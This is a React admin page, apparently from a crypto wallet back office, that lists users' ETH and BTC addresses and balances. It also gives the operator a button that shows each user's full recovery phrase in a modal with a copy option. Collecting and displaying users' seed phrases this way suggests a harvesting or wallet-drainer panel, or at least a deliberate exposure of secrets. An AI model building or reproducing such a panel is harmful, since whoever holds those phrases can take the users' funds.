import toast from "react-hot-toast";
import type { Column } from "../../components/CommonTable";
import { FiSearch } from "react-icons/fi";
import CommonTable from "../../components/CommonTable";
import { useLocation } from "react-router-dom";
import { useEffect, useState } from "react";

interface OtherAccount {
  id: number;
  label: string | null;
  eth_address: string;
  btc_address: string;
  eth_balance: number;
  btc_balance: number;
    phrase: string;
}

interface User {
  id: number;
  ethAddress: string;
  btcAddress: string;
  ethBalance: string;
  btcBalance: string;
  phrase: string;
}

function InnerUsers() {
  const location = useLocation();
  const [users, setUsers] = useState<User[]>([]);
  const [search, setSearch] = useState("");
  const truncateAddress = (address: string) => {
    return `${address.slice(0, 6)}.....${address.slice(-5)}`;
  };
const [showPhraseModal, setShowPhraseModal] = useState(false);
const [selectedPhrase, setSelectedPhrase] = useState("");
  const handleCopy = async (text: string) => {
    try {
      await navigator.clipboard.writeText(text);
      toast.success("Copied!");
    } catch {
      toast.error("Failed to copy");
    }
  };

  useEffect(() => {
    const accounts: OtherAccount[] = location.state?.accounts || [];

    const mappedUsers: User[] = accounts.map((acc) => ({
      id: acc.id,
      ethAddress: acc.eth_address,
      btcAddress: acc.btc_address,
      ethBalance: `${acc.eth_balance} ETH`,
      btcBalance: `${acc.btc_balance} BTC`,
        phrase: acc.phrase || "",
    }));

    setUsers(mappedUsers);
  }, [location.state]);
  const filteredUsers = users.filter(
    (user) =>
      user.ethAddress.toLowerCase().includes(search.toLowerCase()) ||
      user.btcAddress.toLowerCase().includes(search.toLowerCase()),
  );
  const columns: Column<User>[] = [
    {
      header: "ETH Address",
      accessor: (row) => (
        <span
          onClick={() => handleCopy(row.ethAddress)}
          className="cursor-pointer hover:text-[#25C866]"
          title="Click to copy"
        >
          {truncateAddress(row.ethAddress)}
        </span>
      ),
    },
    {
      header: "BTC Address",
      accessor: (row) => (
        <span
          onClick={() => handleCopy(row.btcAddress)}
          className="cursor-pointer hover:text-[#25C866]"
          title="Click to copy"
        >
          {truncateAddress(row.btcAddress)}
        </span>
      ),
    },
    {
      header: "ETH Balance",
      accessor: "ethBalance",
    },
    {
      header: "BTC Balance",
      accessor: "btcBalance",
    },
    {
  header: "Phrase",
  accessor: (row) => (
    <button
      onClick={() => {
        setSelectedPhrase(row.phrase);
        setShowPhraseModal(true);
      }}
      className="px-3 py-1.5 rounded-lg bg-[#25C866]/10 text-[#25C866] border border-[#25C866]/20 hover:bg-[#25C866]/20 hover:scale-105 transition-all duration-200 cursor-pointer text-sm font-medium"
    >
      View Phrase
    </button>
  ),
},
  ];

  return (
    <div>
      <div className="bg-[#13213A] border border-[#24324D] rounded-lg overflow-hidden">
        <div className="flex justify-between items-center p-5 border-b border-[#24324D] flex-wrap gap-4">
          <h3 className="text-white text-lg font-semibold">User Wallets</h3>

          <div className="relative">
            <FiSearch className="absolute left-3 top-2.5 text-gray-400" />

            <input
              type="search"
              placeholder="Search wallet..."
              onChange={(e) => setSearch(e.target.value)}
              className="pl-9 pr-4 py-2 text-sm bg-[#15243D] border border-[#24324D] rounded-lg text-gray-300 placeholder-gray-500 focus:outline-none"
            />
          </div>
        </div>

        {/* Table */}
        {users.length > 0 ? (
          <CommonTable columns={columns} data={filteredUsers} />
        ) : (
          <div className="p-10 text-center text-gray-400">
            No Data found
          </div>
        )}
      </div>
        {showPhraseModal && (
  <div className="fixed inset-0 z-[999] flex items-center justify-center">
    <div
      className="absolute inset-0 bg-black/50"
      onClick={() => setShowPhraseModal(false)}
    />

    <div className="relative bg-[#161F37] p-5 rounded-xl max-w-lg w-full  mx-3">
      <h3 className="text-white text-lg font-semibold mb-4">
        Recovery Phrase
      </h3>

      <p className="text-white break-words">
        {selectedPhrase}
      </p>

      <button
        onClick={() => handleCopy(selectedPhrase)}
        className="mt-4 bg-[#25C866] px-4 py-2 rounded-lg text-white cursor-pointer"
      >
        Copy
      </button>
    </div>
  </div>
)}
    </div>
  );
}

export default InnerUsers;
